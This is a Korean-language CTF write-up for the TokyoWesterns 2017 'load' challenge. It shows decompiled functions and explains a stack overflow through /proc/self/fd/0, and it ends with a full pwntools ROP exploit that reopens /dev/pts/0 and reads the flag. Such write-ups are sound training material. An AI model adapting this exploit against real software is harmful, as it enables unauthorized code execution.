---
title: "2017 TokyoWesterns CTF 4th load"
date: 2020-4-27
ctf: TokyoWesterns CTF
layout: post
published : false
---

* file description
* open("/dev/pts/0", O_RDWR)
* /proc/self/fd/0

```
[*] '/vagrant/ctfs/load'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

main함수에서 전역변수 filename에 입력받고 fileopen함수에서 해당 파일을 열어줍니다. 

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char v4; // [rsp+0h] [rbp-30h]
  __int64 size; // [rsp+20h] [rbp-10h]
  __off_t offset; // [rsp+28h] [rbp-8h]

  setup();
  _printf_chk(1LL, "Load file Service\nInput file name: ");
  input_Str(filename, 128);
  _printf_chk(1LL, "Input offset: ");
  offset = input_Num();
  _printf_chk(1LL, "Input size: ");
  size = input_Num();
  fileopen(&v4, filename, offset, size);
  close_0_1_2();
  return 0LL;
}
```

fileopen을 해주는 함수인데 아까 우리가 전역변수 filename에 준 이름을 열어버린다. 그 fd를 가지고 read를 호출해줍니다.

```c
int __fastcall fileopen(void *a1, const char *a2, __off_t a3, __int64 a4)
{
  size_t nbytes; // [rsp+0h] [rbp-30h]
  __off_t offset; // [rsp+8h] [rbp-28h]
  int fd; // [rsp+2Ch] [rbp-4h]

  offset = a3;
  fd = open(a2, 0, a4);
  if ( fd == -1 )
    return puts("You can't read this file...");
  lseek(fd, offset, 0);
  if ( read(fd, a1, nbytes) > 0 )
    puts("Load file complete!");
  return close(fd);
}
```

stdin, stdout, stderr를 닫아버립니다. 

```c
int close_0_1_2()
{
  close(0);
  close(1);
  return close(2);
}
```

`/proc/self/fd/0` 를 이용해서 stack에 입력받을 수 있다. 그래서 rip control이 가능하다. 근데 close로 0,1,2를 다 닫아버리니까 open으로 stdin, stdout을 복구해서 flag파일을 읽으면 된다. `open("/dev/pts/0", O_RDWR);` 를 2번해주면 된다. 처음에 stdin이 열리고 두번째에 stdout이 열린다. 그리고 flag파일을 여러개 열어주고 rdx가젯이 없어서 csu 가젯으로 대충 어림잡아 fd잡고 bss에 플래그 넣어주고 puts로 출력해주면 된다. 

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./load')
p = process('./load')
prdi = 0x0000000000400a73 # pop rdi ; ret
prsi_r15 = 0x0000000000400a71 # pop rsi ; pop r15 ; ret
name = 0x0000000000601040
csu_pop = 0x0000000000400A6A
csu_call = 0x0000000000400A50

pay = '/proc/self/fd/0\x00'
pay += '/dev/pts/0\x00'
pay += './flag\x00'

p.sendlineafter(':',pay)
p.sendlineafter(':','0')
p.sendlineafter(':','1000')
# pause()

# open('/dev/pts/0',O_RDWR -> 2) 
# open STDIN
pay = 'A'*0x38
pay += p64(prdi)
pay += p64(name+16)
pay += p64(prsi_r15)
pay += p64(2)
pay += p64(0)
pay += p64(e.plt['open'])

# open('/dev/pts/0',O_RDWR -> 2)
# open STDOUT
pay += p64(prdi)
pay += p64(name+16)
pay += p64(prsi_r15)
pay += p64(2)
pay += p64(0)
pay += p64(e.plt['open'])

# open('./flag',O_RDWR)
# open ./flag
for i in range(7):
	pay += p64(prdi)
	pay += p64(name+27)
	pay += p64(prsi_r15)
	pay += p64(2)
	pay += p64(0)
	pay += p64(e.plt['open'])

pay += p64(csu_pop)
pay += p64(0) + p64(1) + p64(e.got['read']) + p64(100) + p64(e.bss() + 0x300) + p64(5) + p64(csu_call)

pay += p64(csu_pop)
pay += p64(0) + p64(1) + p64(e.got['puts']) + p64(0) + p64(0) + p64(e.bss() + 0x300) + p64(csu_call)

p.sendline(pay)

p.interactive()
```

